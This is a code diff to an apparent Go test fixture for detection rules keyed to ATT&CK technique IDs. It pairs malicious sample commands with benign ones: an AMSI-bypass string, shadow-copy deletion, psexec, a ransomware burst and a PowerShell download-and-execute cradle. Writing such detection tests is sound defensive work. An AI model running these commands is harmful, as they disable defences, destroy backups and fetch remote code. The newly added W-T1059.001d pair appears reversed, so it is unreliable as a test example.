@@ -18,10 +18,11 @@ func init() {
 		{"W-T1027", fxProc("powershell.exe", "powershell [convert]::FromBase64String('aGk=')"), fxProc("powershell.exe", "powershell Get-Date")},
 		{"W-T1036", fxProcImg("svchost.exe", "svchost.exe", `C:\Users\a\AppData\Local\Temp\svchost.exe`), fxProcImg("svchost.exe", "svchost.exe -k netsvcs", `C:\Windows\System32\svchost.exe`)},
 		{"W-T1562.001b", fxProc("powershell.exe", "powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"), fxProc("powershell.exe", "powershell Get-Process")},
-		{"W-T1574.002", fxFile(`C:\Users\a\AppData\Local\Temp\evil.dll`), fxFile(`C:\Windows\System32\good.dll`)},
+		{"W-T1574.002", fxFile(`C:\Users\Public\evil.dll`), fxFile(`C:\Users\a\AppData\Local\Temp\good.dll`)},
 		{"W-T1021.001", fxProc("mstsc.exe", "mstsc /v:10.0.0.5"), fxProc("notepad.exe", "notepad a.txt")},
 		{"W-T1570", fxProc("psexec.exe", `psexec \\srv cmd`), fxProc("notepad.exe", "notepad a.txt")},
 		{"W-T1490", fxProc("vssadmin.exe", "vssadmin delete shadows /all /quiet"), fxProc("vssadmin.exe", "vssadmin list shadows")},
-		{"W-T1486", fxFile(`C:\Users\a\Documents\report.docx.locked`), fxFile(`C:\Users\a\Documents\report.docx`)},
+		{"W-T1486", fxRansomBurst(), fxFile(`C:\Users\a\Documents\config.enc`)},
+		{"W-T1059.001d", fxProc("powershell.exe", "powershell Invoke-WebRequest https://x/health"), fxProc("powershell.exe", "powershell iex(iwr http://x/a.ps1)")},
 	}...)
 }
